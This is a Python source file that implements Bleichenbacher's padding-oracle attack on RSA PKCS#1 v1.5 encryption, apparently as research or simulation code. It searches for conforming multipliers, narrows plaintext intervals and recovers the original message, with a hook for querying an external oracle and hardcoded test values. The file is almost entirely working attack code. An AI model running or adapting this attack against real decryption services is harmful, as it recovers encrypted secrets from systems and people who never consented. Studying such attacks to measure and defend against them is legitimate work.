
from binascii import *
import math
#import numpy
import time
from Crypto.Util.number import bytes_to_long, long_to_bytes

from bleich_vals import *
from bleich_tools import *

from pdb import set_trace



def interval_calc(s_found):
    
    interval_list = []
    poss_ints_upper = myfloor((B3+1)*s_found -B2,my_n)
    poss_ints_lower = myceil(B2*s_found -B3+1,my_n)

    for poss_int in range(poss_ints_lower, poss_ints_upper+1):
        lower_limit = myceil(B2+poss_int*my_n,s_found)
        upper_limit = myfloor(B3-1+poss_int*my_n,s_found)
        interval_list.append((lower_limit, upper_limit))    
    return interval_list


def has_common(interval1, interval2):
    if (interval1[1] < interval2[0]) or (interval1[0] > interval2[1]):
        return (False, ())
    else:
        upper_limit = min(interval1[1], interval2[1])
        lower_limit = max(interval1[0], interval2[0])
        return (True, (lower_limit, upper_limit))


def find_common_intervals(interval_list1, interval_list2):
    common_intervals = []
    for int1 in interval_list1:
        for int2 in interval_list2:
            result = has_common(int1, int2)
            if result[0]:
                common_intervals.append(result[1])
    return common_intervals



def find_multiplier(padding_oracle, msg, starting_multiplier, query_limit=None):
    cur_iterations = 1
    s_multiplier = starting_multiplier
    flag_stopped = False
    while True:
        new_msg = padding_oracle.multiply(msg, s_multiplier)
        if padding_oracle.perform_query(new_msg, None):
            break

        cur_iterations+=1
        if query_limit and query_limit==cur_iterations:
            print("Reached query limit")
            flag_stopped = True
            break
        s_multiplier += 1
        if cur_iterations%1000 == 0:
            print("cur %i" %cur_iterations)
       
    return s_multiplier, cur_iterations, flag_stopped



def find_non_multiplier(padding_oracle, msg, starting_multiplier):
    cur_iterations = 1
    s_multiplier = starting_multiplier
    while True:
        new_msg = padding_oracle.multiply(msg, s_multiplier)
        if not padding_oracle.perform_query(new_msg, None):
            break
        cur_iterations+=1
        s_multiplier += 1
        if cur_iterations%1000 == 0:
            print("cur %i" %cur_iterations)
        
    return s_multiplier, cur_iterations




muls_found = []
positive_oracle_query_numbers = []




def simulate_attack_with_message(msg, padding_oracle, s_start = 0, until_diff=3, from_diff=False, fromdiffab = None, fromlastri = 0, verbose = False, query_limit=None):
    s_min = myceil(lala_n, B3)
    performed_step_2b = False
    revert_str = ""
    if s_start == 0:
        s1 = s_min
    else:
        s1 = s_start
    if not from_diff:
        fromdiffab = [[1, 32317006071311007300714876688669951960444102669715484032130345427524655138867890893197201411522913463688717960921898019494119559150490921095088152386448283120630877367300996091750197750389652106796057638384067568276792218642619756161838094338476170470581645852036305042887575891541065808607552399123930385521914333389668342420684974786564569494856176035326322058077805659331026192708460314150258592864177116725943603718461857357598351152301645904403697613233287231227125684710820209725157101726931323469678542580656697935045997268352998638215525166389437335543602135433229604645318478604952148193555853611059596230655]]
        print("starting search for s1 conforming multiplier from value %i" %s1)
    
 

        s1, iteration_count2a, flag_stopped = find_multiplier(padding_oracle, msg, s1, query_limit=query_limit)#, True)
        print( "Search done in %i iterations (step 2a) " %(iteration_count2a, ))
        #set_trace()
        muls_found.append(s1)
        positive_oracle_query_numbers.append(iteration_count2a)
        s1_intervals = interval_calc(s1)
        print("Amount of intervals in step 2a: %d" %(len(s1_intervals), ))
        if verbose:
            print(s1_intervals)

        cur_intervals = s1_intervals
        common_ints = cur_intervals
        
        #vanilla
        cur_s = s1+1
        #cur_s = s1 + s_min-2

        if len(common_ints) != 1 and not flag_stopped:
            print("performing step 2b from si %d" %(cur_s, ))
            performed_step_2b = True
            cur_s, iteration_count2b, flag_stopped = find_multiplier(padding_oracle, msg, cur_s, query_limit=query_limit)#, True)
            muls_found.append(cur_s)
            if padding_oracle.onExternal:
                positive_oracle_query_numbers.append(padding_oracle.qcount)
            else:
                positive_oracle_query_numbers.append(padding_oracle.simqcount)
            s2b_intervals = interval_calc(cur_s)
            cur_intervals = find_common_intervals(s1_intervals, s2b_intervals)
            
            if verbose:
                print (len(cur_intervals))
            
            if flag_stopped:
                return (1, 1, 0, padding_oracle, performed_step_2b)
            if len(cur_intervals) != 1:
                print("Step 2b needs to be repeated")
                #cur_s2, iteration_count2b2, flag_stopped = find_multiplier(padding_oracle, msg, cur_s, query_limit=query_limit)#, True)
                #muls_found.append(cur_s)
            
                #set_trace()
            else:
                print("performed step 2b in %d iterations" %(iteration_count2b, ))
            common_ints = cur_intervals
      

    print("performing step 2c")

    if from_diff:
        common_ints = [fromdiffab]

    m_i_low = common_ints[0][0]
    m_i_high = common_ints[0][1]

    a= m_i_low
    b = m_i_high


    def current_attack_state_callback():
        return (a, b, r_i, padding_oracle)

    if not from_diff:
        s_found = cur_s
        r_i = myceil(2*(b*s_found-B2), my_n)
    else:
        r_i = fromlastri

    if query_limit and query_limit< padding_oracle.simqcount:
        print("reached query limit")
        return (a, b, r_i, padding_oracle, performed_step_2b)

    revert_ab= [(m_i_low,  m_i_high, r_i)]

    count_false_in_a_row = 0
    start_time = time.time()
    while True:
      
        if query_limit and query_limit< padding_oracle.simqcount:
            print("reached query limit")
            return (a, b, r_i, padding_oracle, performed_step_2b)

        low_i = myceil(B2+r_i*my_n, b)
        up_i = myfloor(B3+r_i*my_n, a)
        if verbose:        
            print(r_i)
            print(low_i)
            print(up_i)
        for val in range(low_i, up_i+1):
            new_msg = padding_oracle.multiply(msg, val)
            
            conforms = padding_oracle.perform_query(new_msg, current_attack_state_callback)
            if conforms:
                if verbose:
                    print("Found conforming at query %d" %padding_oracle.qcount)
                count_false_in_a_row = 0
                s_found = val
                new_a = max(a, myceil(B2+r_i*my_n, s_found))
                new_b = min(b, myfloor(B3+r_i*my_n -1, s_found))

                muls_found.append(val)
                if padding_oracle.onExternal:
                    positive_oracle_query_numbers.append(padding_oracle.qcount)
                else:
                    positive_oracle_query_numbers.append(padding_oracle.simqcount)
            

                a = new_a
                b = new_b

                r_i = myceil(2*(b*s_found-B2), my_n)
                revert_ab.append((new_a, new_b, r_i))
                if len(revert_ab) > 15:
                    new_revert_ab = revert_ab[-15:]
                    revert_ab = new_revert_ab
                break


        else:
            count_false_in_a_row += 1
            if count_false_in_a_row >= 100:
                if len(positive_oracle_query_numbers) <3:
                    print("Found many false positives in a row early on - stopping\n")
                    int_diff = len(hex(b -a))
                    until_diff = int_diff
                    break
                count_false_in_a_row =0
                print("Reverting after finding many false queries in a row\n")
                revert_str += "Reverting at %d after finding many false queries in a row\n" %(padding_oracle.simqcount, )
                a = revert_ab[0][0]
                b = revert_ab[0][1]
                r_i = revert_ab[0][2]
                revert_ab = [(a, b, r_i)] 
            r_i += 1
        int_diff = len(hex(b - a))    
        if padding_oracle.simqcount%100==0:
            print("Current nibble difference: %d" %(int_diff, ))
        if int_diff <= until_diff: #one byte left - check last ten or so messages
            after_time = time.time()
            print("good enough")
            print((hex(a), hex(b)))
            print("It took %d seconds" %(after_time-start_time, ))
            print("and %d queries" %(padding_oracle.qcount, ))                
            print("and %d simulation queries" %(padding_oracle.simqcount, ))
            diff_result_string = ""
            diff_result_string += "It took %d seconds\n" %(after_time-start_time, )
            diff_result_string += "and %d queries" %(padding_oracle.qcount, )
            diff_result_string += "and %d simulation queries" %(padding_oracle.simqcount, )
           

            break

    
    if until_diff >3:
        diff_result_string += revert_str
        return (a, b, r_i-1, diff_result_string, performed_step_2b, )

    if padding_oracle.onCT:
        c0 = msg
    else:
        c0 = pow(m0, lala_e, lala_n)
    
        print("Not on encryption")
    if a==b:
        print("Found original msg")
        print(a)
        diff_result_string += revert_str
        return (a, b, r_i-1, diff_result_string, performed_step_2b)
    else:
        print("Found range")
        print(a)
        print(b)
    for poss_msg in range(a, b+1):
        #set_trace()
        c0_inhex = hex(pow(poss_msg, lala_e, lala_n))[2:]
        c0_inlong = pow(poss_msg, lala_e, lala_n)
        if len(c0_inhex) == 511:
            c0_inhex = '0'+c0_inhex

        if (c0==c0_inlong):
            print("Found original msg")
            print(poss_msg)
            diff_result_string += revert_str
            return c0, poss_msg, diff_result_string, performed_step_2b
            #break
        

#10 4933 queries leave 88 queries
LAST5AB = (1464205917639067541984950617338164070463675780139895116193619660298777537525122475351360204492538979529905841134864058293926945088471864509524286278599818395322964981395336464963715820247908155780006425158162400075747450321226461009926339602587716337971331626772344997963359345099028786186486604130197170231981701961731376582680745104766338298085062925187690722057550559052064167761854883515921181845492766621395197409520334644205264080667474448360094906967911284737895181582025251712525729604801874424404825155279645544767410401461707402812729187877572385785519685789810188184873940185865689928393487326984600884, 1464205917639067541984950617338164070463675780139895116193619660298777537525122475351360204492538979529905841134864058293926945088471864509524286278599818395322964981395336464963715820247908155780006425158162400075747450321226461009926339602587716337971331626772344997963359345099028786186486604130197170231981701961731376582680745104766338298085062925187690722057550559052064167761854883515921181845492766621395197409520334644205264080667474448360094906967911284737895181582025251712525729604801874424404825155279645544767410401461707402812729187877572385785519685789810188184873940185865689928393487328720136289)
LAST5RI = 21129815833819313100806782659259200130799309143892244534509761989069201994752432773464331878052449843800175024059591706609066399119240955029226729005475385008719055963029028101174880220982308343220826168399086592766859343160818890610165016833635991020352386021821960354220439615102817635870796047141066638246735844200834396014144744568464285709414158140350794356342647219378705969871912736587540730436221150229610563146780594224544766501734035436970081730980230835446525041482370097994318618988412506294592006792712461801190684137886303195298376490816146766111489323351697989824749375411917782998547


if __name__ == '__main__':

    #7281 queries
    m0 = anylenm0_list[29]
    short14 = (1446365595185610411497538089426702698917606470228342593581971837019033779145645403434199896658348091320645264567963726950890326510329611784590461358785664425042722518618576976138398010077443169940430957186198773388595311241229678253534848084420524008760729909513096151589582109383698669300674165083284127749452447239470491899947453618328514314907564109876382396015479195394908275411847762459583308779428171429815071519869959886341638800740275689258653890491760366052714377760807417643702577891215507895143422661300263511140994842344338656160044842295740884451825331640873790219371123902343758962630466954082666880, 1930)
    

    m0 = short14[0]
    c0 = pow(m0, lala_e, lala_n)
    
    padding_oracle = PaddingOracleAnyLength()
    padding_oracleonct = PaddingOracleAnyLength(onCT=True)
    
    s_min = myceil(lala_n, B3)

    
    res = simulate_attack_with_message(msg=m0, padding_oracle=padding_oracle, until_diff=3,verbose=True) 
    
    if res:
       print(res)

    print("Positive queries:")
    print(positive_oracle_query_numbers)



   

